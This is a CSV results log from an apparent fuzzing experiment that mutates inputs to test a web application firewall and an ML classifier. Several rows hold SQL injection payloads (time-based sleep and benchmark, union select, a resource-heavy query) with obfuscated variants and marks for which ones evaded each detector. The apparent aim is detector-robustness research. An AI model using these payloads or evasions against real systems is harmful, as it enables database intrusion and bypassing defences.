Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
11,2024-12-17T14:58:42.156705,h?ele77,200,200,200,both_correct,h?ele77,2024-12-17T14:58:42.620886,200,200,both_correct,h?ele77,2024-12-17T14:58:44.083485,200,200,both_correct,h?ele77,2024-12-17T14:58:45.553036,200,200,both_correct,h?ele77,2024-12-17T14:58:47.020376,200,200,both_correct,h?ele77,2024-12-17T14:58:48.490855,200,200,both_correct,h?ele77,2024-12-17T14:58:50.140916,200,200,both_correct,h?ele77,2024-12-17T14:58:51.670995,200,200,both_correct,h?ele77,2024-12-17T14:58:53.178530,200,200,both_correct,h?ele77,2024-12-17T14:58:54.681690,200,200,both_correct,h?ele77,2024-12-17T14:58:56.155611,200,200,both_correct
12,2024-12-17T14:58:57.627908,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'wdoi'  =  'wdoi",403,403,200,waf_correct_ml_incorrect,"1' or elt  (  6272/**/ =  '27Fz'<>'27FzT',sleep 
(  (SELECT  AND 1)   )    )    and 'wdoi'  =  'wdoi",2024-12-17T14:59:01.059570,403,200,waf_correct_ml_incorrect,"1' or elt/**/ (  0x13e9 LIKE 5097/**/ =  '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT 1))   )    )    and 'wdoi'  =  'wdoi",2024-12-17T14:59:06.902276,403,403,both_correct,"(sElECT 1)' or elt/**/ (  0x13e9 LIKE 7429 IN (7428,7429,7430)/**/ =  '27Fz'<>'27FzT',sleep /**/(  (SELECT  AND (SELECT (SELECT 1)))   )    )   	and 'wdoi'  =  'wdoi",2024-12-17T14:59:13.867202,403,403,both_correct,"(selECt (SELECT 1))' or elt/**/ (  0x13e9 LIKE  OR 0 LIKE 627 IN (7428,7429,7430)  =  '27Fz'<>'27FzT',sleep /**/(  (SELECT  AND (SELECT (SELECT 1)))   )    )   
and 'wdoi'  =  'wdoi",2024-12-17T14:59:23.152591,403,403,both_correct,"(seLeCT (sELeCt 1))' or elt/**/ (  0x13e9 LIKE  OR (SELECT 1) LIKE 627 IN (7428,7429,4238=0x108e)  =	 '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT (SELECT 1)))   )    )   
and 'wdoi'  =  'wdoi",2024-12-17T14:59:32.755581,403,403,both_correct,"(SELECt (sELeCt 1))' or elt  (  0x13e9 LIKE  OR (SELECT 1) LIKE (SELECT 1) IN ('Nz'!='Nz""',0x1d05,4238=0x108e)  =  '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT (SELECT 1)))   )    )   
and 'wdoi'  =  'wdoi",2024-12-17T14:59:42.795190,403,403,both_correct,"(sElECT (sELeCT 1))' or elt  (  0x13e9/*xi-4E*/LIKE  OR (SELECT 0x1) LIKE (SELECT 1) IN ('Nz'!='Nz""',0x1d05, OR 0=308=0x108e)  =  '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT (SELECT 1)))   )    )    and 'wdoi'  =  'wdoi",2024-12-17T14:59:53.967144,403,403,both_correct,"(SeLECt (Select 1))' or elt  ( 	0x13e9 LIKE  OR (SELECT 0x1) LIKE (SELECT (SELECT 1)) IN ('Nz'!='Nz""',0x1d05, OR 4567 NOT LIKE 4568=0x134=0x108e)  =  '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT (SELECT 1)))   )    )    and 'wdoi'  =  'wdoi",2024-12-17T15:00:05.509791,403,403,both_correct,"(SeLECt (seLECT 1))' or elt  ( 
0x13e9 LIKE  OR (SELECT 0x1) LIKE (SELECT (SELECT 1)) IN ('Nz'!='Nz""',0x1d05, OR 9000 IN (8999, OR 0,0x2329) NOT LIKE 4568=0x134=0x108e)  =  '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT (SELECT 1)))   )    )/**/   and 'wdoi'  =  'wdoi",2024-12-17T15:00:18.312787,403,403,both_correct,"(SELeCT (SElecT (SELECT 1)))' or elt  (  0x13e9 LIKE  OR (SELECT 0x1) LIKE (SELECT (SELECT (SELECT 1))) IN ('Nz'!='Nz""',0x1d05, OR 9000 IN (1986!=1987, OR 0,0x2329) NOT LIKE 4568=0x134=0x108e)  =  '27Fz'<>'27FzT',sleep  (  (SELECT  AND (SELECT (SELECT 1)))   )    )    and 'wdoi'  =  'wdoi",2024-12-17T15:00:31.930126,403,403,both_correct
13,2024-12-17T15:00:46.956815,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",403,403,403,both_correct,"- OR 0' /**/)  
union all select 4830,(SELECT 4830),4830,4830,4830,4830,'U'='U',4830--",2024-12-17T15:00:50.356386,403,403,both_correct,"- || 0'
 )  
union all select 'rG' LIKE 'rG',(SELECT 4830),4830,4830,4830, AND 1,'U'='U',(SELECT 4830)--",2024-12-17T15:00:55.521193,403,403,both_correct,"-	 OR  (SELECT 0)'
 )/*(m7*/ 
union all select 'rG' LIKE 'rG',(SELECT 4830),4830,4830,(SELECT 1), AND 9517=9517,'U'='U',(sEleCT 4830)--",2024-12-17T15:01:01.620841,403,403,both_correct,"-	 ||  (seleCt 0)'
 )/*(m7*/ 
union all select 'rG' LIKE 'rG',(SELECT
4830),4830,(SELECT 1),(SELECT 1),/*u9*/AND 0x252d=9517,'U'='U',(SelEct 'lq6'!='lq64')--",2024-12-17T15:01:09.408331,403,403,both_correct,"-	
 OR   (SELEct 0)'
 )/*(m7*/ 
union all select 'rG' LIKE 'rG',(SELECT
4830), OR 0,(SELECT 1),(SELECT 'O' LIKE 'O'),/**/AND 0x252d=(SELECT 9517),'U'='U',(SelEct/**/'lq6'!='lq64')--",2024-12-17T15:01:17.897980,403,403,both_correct,"-	
 Or   (selEcT 0)'
 )/*(m7*/ 
union all	select 'rG' LIKE/**/'rG',(SELECT
4830), OR (SELECT 0),(SELECT 'j' LIKE 'j'),(SELECT 'O' LIKE 'O'),/**/AND 0x252d=(SELECT  AND 1),'U'='U',(SelEct/**/'lq6'!='lq64')--",2024-12-17T15:01:27.453881,403,403,both_correct,"-	
 Or   (seleCt (seLect 1))'
 )/*(m7*/ 
union all	select 'rG' LIKE/**/'rG',(SELECT
920!=921), OR/**/(SELECT 0),(SELECT 'j' LIKE 'j'),(SELECT 'O' LIKE	'O'),/**/AND 0x252d=(SELECT  AND 0x1),'U'='U',(SelEct/**/'lq6'!='lq64')--",2024-12-17T15:01:38.496487,403,403,both_correct,"-	
 or   (sELEcT (sELect ';0' NOT LIKE ';0z'))'
 )/*(m7*/ 
union all
select 'rG' LIKE/**/'rG',(SELECT
(SELECT 1)!=921), OR/**/(SELECT 0x0),(SELECT 'j' LIKE 'j'),(SELECT 'O' LIKE	'O'),/**/AND 0x252d=(SELECT  AND 0x1),'U'='U',(SelEct 'lq6'!='lq64')--",2024-12-17T15:01:50.071488,403,403,both_correct,"-	
 OR   (select (SeLEcT ';0' not like ';0z'))'
 )/*(m7*/ 
union all
select 'rG'	LIKE/**/'rG',(SELECT
(SELECT (SELECT 0x1))!=928<>929), OR/*%f+~t*/(SELECT 0x0),(SELECT 'j' LIKE 'j'),(SELECT 'O' LIKE	'O'), AND 0x252d=(SELECT  AND 0x1),'U'='U',(SelEct 'lq6'!='lq64')--",2024-12-17T15:02:03.123344,403,403,both_correct,"-	
 oR   (SELECt (SeLeCT ';0' not like ';0z'))'
 )/*(m7*/ 
union all
select 'rG'	LIKE/**/'rG',(SELECT
(SELECT (SELECT 0x1))!=(SELECT 928)<> OR 2655 NOT LIKE 2656), OR/*%f+~t*/(SELECT 0x0),(SELECT 'j' LIKE 'j'),(SELECT 'O' LIKE
'O'), AND/**/0x252d=(SELECT  AND 0x1),'U'='U',(SelEct 'lq6'!='lq64')--",2024-12-17T15:02:16.715187,403,403,both_correct
14,2024-12-17T15:02:32.033781,"c/ luarca, 151, 7?g",200,200,200,both_correct,"c//**/luarca, 0x97, 8878<>	&& 1?g",2024-12-17T15:02:33.040918,200,200,both_correct,"c/ luarca, 0x97, (sElecT	1)<>	 aND  (SeLeCt 'rE$' lIkE 'rE$')?g",2024-12-17T15:02:35.747036,403,200,waf_incorrect_ml_correct,"c/ luarca, 0x97, (SELeCT
 OR 0<>0xb15) not like 	 And  (sELecT/**/'rE$' like 'rE$')?g",2024-12-17T15:02:39.806542,200,200,both_correct,"c/ luarca, 0x97, (seLeCt
 OR (SELECT (SELECT 1)!=4761)!=0xb15) not like 		And  (SElECt 'rE$' LIke 'rE$')?g",2024-12-17T15:02:44.970678,200,403,waf_correct_ml_incorrect,"c/ luarca, 0x97, (SELeCT
 || (Select (sEleCT  aNd 8778 NOT LIKE 8779)!=0x1299)!=0xb15)/*/H=*/not like 	 aNd  (SelEcT 'rE$' liKE 'rE$')?g",2024-12-17T15:02:51.323736,403,200,waf_incorrect_ml_correct,"c/ luarca, 0x97, (SeleCt  /**/OR  (SeleCt (seLECt  and  And 0x1 NOT LIKE 'M{'='M{')!=0x1299)!=0xb15)/*/H=*/not like 	 AnD  (SELECt 'rE$' LIKE 'rE$')?g",2024-12-17T15:02:58.852705,200,200,both_correct,"c/ luarca, 0x97, (sELECt  /**/OR  (SELecT (sElecT  anD  aNd 0x1 NOT LIKE 'M{'='M{')!=0x1299) not like 0xb15)/*/H=*/not like 
/**/and  (SElEcT  OR 0)?g",2024-12-17T15:03:06.998651,200,200,both_correct,"c/ luarca, 0x97, (seleCt   Or  (selecT
(SeleCT  AND  AnD 0x1 NOT LIKE 'M{'='M{')<>0x1299) not like 0xb15)/*/H=*/not like 
/**/AND  (seLECt  Or (selECt 0x1))?g",2024-12-17T15:03:15.442452,403,403,both_incorrect,"c/ luarca, 0x97, (selECT   OR  (sElEct
(SELECT  aNd  AND 0x1 NOT	LIKE 'M{' like 'M{')<>0x1299) not like 0xb15)/*/H=*/not like 
 AND  (selEct  oR (selEcT 0x1))?g",2024-12-17T15:03:23.860959,403,403,both_incorrect,"c/ luarca, 0x97, (seLEct   or  (SelEcT
(sELECT  AnD	 AnD 0x1 NOT	LIKE/**/'M{' lIkE 'M{')!=0x1299) not like 0xb15)/*/H=*/not like 
 ANd  (sELecT  or (SelEcT 0x1))?g",2024-12-17T15:03:32.467188,403,200,waf_incorrect_ml_correct
15,2024-12-17T15:03:41.417088,carbonell calvet,200,200,200,both_correct,"carbonell
calvet",2024-12-17T15:03:42.364069,200,200,both_correct,carbonell calvet,2024-12-17T15:03:44.255116,200,200,both_correct,"carbonell
calvet",2024-12-17T15:03:46.162578,200,200,both_correct,carbonell/*3[ee*/calvet,2024-12-17T15:03:48.060473,200,200,both_correct,carbonell calvet,2024-12-17T15:03:50.258353,200,200,both_correct,carbonell	calvet,2024-12-17T15:03:52.189547,200,200,both_correct,carbonell calvet,2024-12-17T15:03:54.075225,200,200,both_correct,carbonell	calvet,2024-12-17T15:03:55.963236,200,200,both_correct,carbonell calvet,2024-12-17T15:03:57.793380,200,200,both_correct,"carbonell
calvet",2024-12-17T15:03:59.671949,200,200,both_correct
16,2024-12-17T15:04:01.550659,25613,200,200,403,waf_correct_ml_incorrect,'U' not like 'UA',2024-12-17T15:04:01.938436,200,403,waf_correct_ml_incorrect,"'U'/**/not
like 'UA'",2024-12-17T15:04:03.851788,200,200,both_correct,'U' not	like 'UA',2024-12-17T15:04:05.929381,200,403,waf_correct_ml_incorrect,"'U'/**/not
like 'UA'",2024-12-17T15:04:07.892166,200,200,both_correct,"'U' not
like
'UA'",2024-12-17T15:04:10.000111,200,200,both_correct,"'U'/**/not like
'UA'",2024-12-17T15:04:11.923568,200,200,both_correct,"'U'/*zi4K*/not	like
'UA'",2024-12-17T15:04:13.967197,200,200,both_correct,'U'/*H*/not	like/**/'UA',2024-12-17T15:04:16.224212,200,200,both_correct,'U'/*H*/not/**/liKE/**/'UA',2024-12-17T15:04:18.441975,200,200,both_correct,'U'/*Ql/**/<n*/not/**/LiKe/**/'UA',2024-12-17T15:04:20.844838,403,200,waf_incorrect_ml_correct
17,2024-12-17T15:04:23.564696,"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",403,403,200,waf_correct_ml_incorrect," && 0x23ca!=9163  /*Al@<*/)    )    Or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    aNd    (    (   8189 	=  8189",2024-12-17T15:04:29.151963,200,200,both_incorrect,"  and  0x23ca!=9163 	/*Al@<*/)    )    OR 'v'='v'  =  benchmark  (   OR 0,md5  (  0x694a4745   )    )    aND    (   /**/(   8189 	=  0x1ffd",2024-12-17T15:04:36.422133,200,200,both_incorrect,"  aNd  0x23ca!= OR 0 	/*Al@<*/)    )    oR 'v'='v'  =  benchmark  (  
Or 'p' NOT LIKE 'p7',md5  (  0x694a4745   )  /**/ )    aNd    (   /**/(   (SELECT 8189) 	=  0x1ffd",2024-12-17T15:04:44.063406,200,200,both_incorrect,"  anD  0x23ca!= oR  AND (SELECT 1) 	/**/)    )    OR 'v' LiKe 'v'	 =  benchmark  (  
oR/**/'p' NOT LIKE 'p7',md5  (  0x694a4745   )  /**/ )    anD    (   /*OC*/(   (SElect ';.y\' NOT LIKE ';.y\%') 	=  0x1ffd",2024-12-17T15:04:53.299282,200,200,both_incorrect,"  aNd  0x23ca!= Or  AnD (SeLeCt (SeLeCT  oR '|`' NOT LIKE '|`Z')) 	/**/)    )    oR 'v' LIKE 'v'	 =  benchmark  (  
Or 'p' NOT LIKE 'p7',md5  (  0x694a4745
  )  /**/ )    and    (   /*OC*/(   (SelecT ';.y\' NOT LIKE ';.y\%') 	=  0x1ffd",2024-12-17T15:05:04.012412,200,200,both_incorrect,"  ANd  0x23ca!= or  ANd (SelecT (SeLect  OR '|`' NOT LIKE '|`Z')) 	/**/)    )    OR  OR '0'<>'0S'	 =  benchmark  (  
OR 'p' not like 'p7',md5  (  0x694a4745	  )    )    aNd    (   /*OC*/(   (SElEct ';.y\' NOT LIKE ';.y\%') 	=  0x1ffd",2024-12-17T15:05:16.263188,200,200,both_incorrect,"  ANd  0x23ca!= oR  anD (select (seLECt  Or '|`' NOT LIKE '|`Z')) 	 )    )    or  or ' OR '<' NOT LIKE '<(SElEcT 5)''!='0S'	 =  benchmark  (  	OR 'p' not like 'p7',md5  (  0x694a4745	  )    )    aNd    (   /**/(   (select ';.y\' NOT LIKE ';.y\%') 	=  0x1ffd",2024-12-17T15:05:28.347078,403,403,both_correct,"  ANd  0x23ca!= or  aND (SElEcT (SEleCT  Or '|`' NOT LIKE '|`Z')) 	 )    )    oR  Or ' OR '<' NOT LIKE '<(SelECT (selEcT 1953!= AND 1))''!='0S'	  LIKE   benchmark  (  	OR 'p' not like 'p7',md5  (	 0x694a4745	  )    )    anD /**/  (   /*PJ*/(   (SeLecT ';.y\' NOT LIKE ';.y\%') 	=  0x1ffd",2024-12-17T15:05:41.559157,403,200,waf_correct_ml_incorrect,"  And  0x23ca!= oR  and (sElecT (seLEcT  or '|`' NOT LIKE '|`Z')) 	 )    )    oR  or ' OR '<' NOT LIKE '<(seLeCT (sELect (SelECt (SELECT 1))<> AND 'S' NOT LIKE 'Su'))''!='0S'	  LIKe   benchmark  (  
Or 'p' not like 'p7',md5  (	 0x694a4745	  )    )    aNd    (   /**/(   (seLecT ';.y\' NOT LIKE ';.y\%') 	=  0x1ffd",2024-12-17T15:05:56.160958,403,403,both_correct,"  ANd  0x23ca!= OR  AnD (seleCT (SELECT  OR '|`' NOT LIKE '|`Z')) 	 )    )    Or  Or ' OR '<' NOT LIKE '<(SeLECT (selecT (SelECT (SElect  OR 0x0))<> AnD 'S' NOT LIKE 'Su'))''!='0S'	  likE   benchmark  (  	OR 'p' not like 'p7',md5  (	 0x694a4745	  )    )    aNd    (   /**/(   (seLEct/*Q?|*/';.y\' NOT LIKE ';.y\%') 	 lIkE   0x1ffd",2024-12-17T15:06:12.181132,403,403,both_correct
18,2024-12-17T15:06:28.663736,marlet esparraguera,200,200,200,both_correct,marlet/**/esparraguera,2024-12-17T15:06:29.714672,200,200,both_correct,"marlet
esparraguera",2024-12-17T15:06:32.058282,200,200,both_correct,marlet/**/esparraguera,2024-12-17T15:06:34.133476,200,200,both_correct,marlet esparraguera,2024-12-17T15:06:36.288771,200,200,both_correct,marlet	esparraguera,2024-12-17T15:06:38.309438,200,200,both_correct,"marlet
esparraguera",2024-12-17T15:06:40.327819,200,200,both_correct,marlet/**/esparraguera,2024-12-17T15:06:42.335461,200,200,both_correct,"marlet
esparraguera",2024-12-17T15:06:44.496699,200,200,both_correct,marlet	esparraguera,2024-12-17T15:06:46.523851,200,200,both_correct,marlet/*(*/esparraguera,2024-12-17T15:06:48.547249,200,200,both_correct
19,2024-12-17T15:06:50.754242,3600,200,200,200,both_correct," anD
0x1",2024-12-17T15:06:51.081986,200,200,both_correct,/**/aNd	0x1,2024-12-17T15:06:52.512439,200,200,both_correct,	anD	0x1,2024-12-17T15:06:54.158517,200,200,both_correct,"
ANd	0x1",2024-12-17T15:06:55.624600,200,200,both_correct,	and	0x1,2024-12-17T15:06:57.087844,200,200,both_correct,/**/AND	0x1,2024-12-17T15:06:58.568326,200,200,both_correct,/**/&&/**/0x1,2024-12-17T15:07:00.187961,200,200,both_correct,/*-}*/ ANd  0x1,2024-12-17T15:07:01.940092,200,200,both_correct,"/*Q!*/
and/**/ 0x1",2024-12-17T15:07:03.763243,200,200,both_correct,"/**/
And 	0x1",2024-12-17T15:07:05.717018,200,200,both_correct
20,2024-12-17T15:07:07.463287,rinaldi albiol,200,200,200,both_correct,rinaldi/**/albiol,2024-12-17T15:07:08.277437,200,200,both_correct,"rinaldi
albiol",2024-12-17T15:07:10.192902,200,200,both_correct,rinaldi/**/albiol,2024-12-17T15:07:11.976453,200,200,both_correct,rinaldi	albiol,2024-12-17T15:07:13.901729,200,200,both_correct,"rinaldi
albiol",2024-12-17T15:07:15.703564,200,200,both_correct,rinaldi/**/albiol,2024-12-17T15:07:17.517993,200,200,both_correct,rinaldi albiol,2024-12-17T15:07:19.482822,200,200,both_correct,rinaldi/**/albiol,2024-12-17T15:07:21.275846,200,200,both_correct,rinaldi albiol,2024-12-17T15:07:23.457321,200,200,both_correct,rinaldi/**/albiol,2024-12-17T15:07:25.334598,200,200,both_correct
21,2024-12-17T15:07:27.283841,18212,200,200,200,both_correct,(selECT/**/ AND 1!=8917),2024-12-17T15:07:27.674820,403,200,waf_incorrect_ml_correct,"(SeleCT 
ANd 881!=882<>(SELECT (SELECT 1)))",2024-12-17T15:07:29.899218,403,403,both_incorrect,(SELeCT  AND 's'/**/lIke 's'!=0x372 not like (SeLEct (SELECt  aND 1))),2024-12-17T15:07:33.061356,403,403,both_incorrect,(sElECt /**/anD 's'/**/LIKe 's'!=0x372 not like (select (seleCT  and (sElEct 6267)	lIkE  aNd 1))),2024-12-17T15:07:37.403878,403,403,both_incorrect,"(sEleCt /*Q(*{*/aNd 's' lIKe 's'!=0x372 not like (sEleCt (seLeCt  ANd (SELeCt (SELECT 6267)) lIKE  and  aNd 2344 IN (2343,2344,2345))))",2024-12-17T15:07:43.158781,403,403,both_incorrect,"(SEleCT /*Q(*{*/AND 's' liKE	's' not like 0x372 not like (SELecT (selEct  ANd/**/(SELeCt (SELeCt (SeLEct (SeLecT 1)))) LIke  anD  anD 6627 NOT LIKE 6628 iN (2343,2344,2345))))",2024-12-17T15:07:50.751989,403,403,both_incorrect,"(SElect /*Q(*{*/And 's' LIKe	's' not like 0x372 not	like (SELeCT (selEct  aND (seleCT (sElecT (SeLECT (SElECT  AND 0x1)))) LIKe  AND  And 6627 not like 6628 in (2343,8880 IN (8879,8880,8881),2345))))",2024-12-17T15:08:00.366241,403,403,both_incorrect,"(seLecT /*Q(*{*/ANd 's' Like	's' not like 0x372 not	like (seLeCT (SEleCt  And (sEleCt (SELeCt (SeLECT (selecT  aND 0x1)))) LIKe  ANd/**/ and 6627 not like 6628 in (2343,8880	iN (8879, anD ';'<>';0x1',8881),2345))))",2024-12-17T15:08:10.975703,403,403,both_incorrect,"(SELECt /*Q(*{*/AND 's' like	's' not like 0x372 not	like (seLecT (selEcT  aNd (SELECT (SelecT (SeLecT (SEleCT  AND 0x1)))) LiKE  anD/*h""1/U*/ AND 6627 not like 6628/**/in ((SELECT 1),8880
In (8879, and ';'<>';0x1','_6CzF'<>'_6CzFg'),0x929))))",2024-12-17T15:08:22.335662,403,403,both_incorrect,"(SElect /*Q(*{*/anD 's' lIKe	's' not like 0x372 not like (seleCt (sElECt  AND (SElECt (sElECt (sELECt (seLeCt  and 0x1)))) LIkE  AND/*h""1/U*/ AnD 5332 NOT LIKE 5333 not like (SELECT 6628)/**/IN/**/((SEleCt 1), AND 1
in (8879, ANd ';'<>';0x1','_6CzF' NOT LIKE '_6CzFg'),0x929))))",2024-12-17T15:08:34.746826,403,403,both_incorrect
22,2024-12-17T15:08:49.126684,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",403,403,200,waf_correct_ml_incorrect,"1%' or char  (  9158 NOT LIKE 9159  )  ||char  (  (SELECT 1)  )  ||char  (  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  ( /**/char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'	 =  '",2024-12-17T15:09:00.875697,403,200,waf_correct_ml_incorrect,"1%' or char  (  (SELECT 9158) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT 1)  )  ||char  (  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char 	(   AND 1  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'	 =  '",2024-12-17T15:09:15.187028,403,403,both_correct,"1%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT 1)  )  ||char /**/(  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (	 char  (  65  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  83  )  ,null  )  ,0  )  , OR 0  )  ,null  )   and '%'	 =  '",2024-12-17T15:09:29.860314,403,403,both_correct," Or 0%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT 1)  )  ||char /**/(  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (
 char  (  65  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT 83)  )  ,null  )  ,0  )  , OR '|(`3' NOT LIKE '|(`3M'  )  ,null  )  /**/and '%'	 =  '",2024-12-17T15:09:45.193842,403,403,both_correct," oR 0%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT (SELECT 1))  )  ||char /**/(  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (	 char  (  65  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,0  )  , OR '|(`''6t'<>''6t6'' NOT LIKE '|(`3M'  )  ,null  )  /**/and '%'	 =/**/ '",2024-12-17T15:10:02.281732,403,403,both_correct," or 0%' or char
 (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT (SELECT (SELECT 0x1)=6787))  )  ||char  (  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (	 char  (  65  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,0  )  , OR '|(`''6t'<>''6t6'' NOT LIKE '|(`3M'  )  ,null  )  /**/and '%'	 =/**/ '",2024-12-17T15:10:20.799638,403,403,both_correct," or 0%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT (SELECT (SELECT 0x1)= OR 0))  )  ||char  (  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  ( /**/left  (  crypt_key  (	 char  (  (SELECT 8342)!=8343  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,0  )  , OR '|(`''6t'<>''6t6'' NOT LIKE '|(`3M'  )  ,null  )  /**/and '%'	 =/*uk*/ '",2024-12-17T15:10:39.891273,403,403,both_correct," oR '3?'!='3?4'%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT (SELECT (SELECT 0x1)= OR  OR 0))  )  ||char  (  105  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (	 char 	(  (SELECT 8342)!=0x2097  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,0  )  , OR '|(`''6t'<>''6t6'' NOT LIKE '|(`3M'  )  ,null  )  /*y.81X*/and '%'	 =/**/ '",2024-12-17T15:11:00.176053,200,403,waf_incorrect_ml_correct," Or '3?'<>'3?(SELECT 4)'%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT (SELECT (SELECT 0x1)= OR  OR 0))  )  ||char  (   OR 0  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (	 char 	(  (SELECT '(s^'='(s^')!=0x2097  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,0  )  , OR '|(`''6t'<>''6t6'' NOT LIKE '|(`3M'  )  ,null  )  /**/and '%'  =  '",2024-12-17T15:11:21.339289,200,403,waf_incorrect_ml_correct," or '3?'!='3?(SELECT 4)'%' or char  (  (SELECT 0x23c6) NOT LIKE 'F'!='F_'  )  ||char  (  (SELECT (SELECT (SELECT 0x1)= OR  OR 0))  )  ||char  (   OR 0  )  ||char  (  0x64  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char 	(  (SELECT '(s^'='(s^')!=0x2097  )  ||char 	(   AND 'j'<>'jw'  )  ||char  (  (SELECT (SELECT '<'!='<V'))  )  ,null  )  ,(SELECT 0x1)  )  , OR '|(`''6t'<>''6t6'' NOT LIKE '|(`3M'  )/**/ ,null  )  /*CQua**/and '%'  =  '",2024-12-17T15:11:43.023564,200,403,waf_incorrect_ml_correct
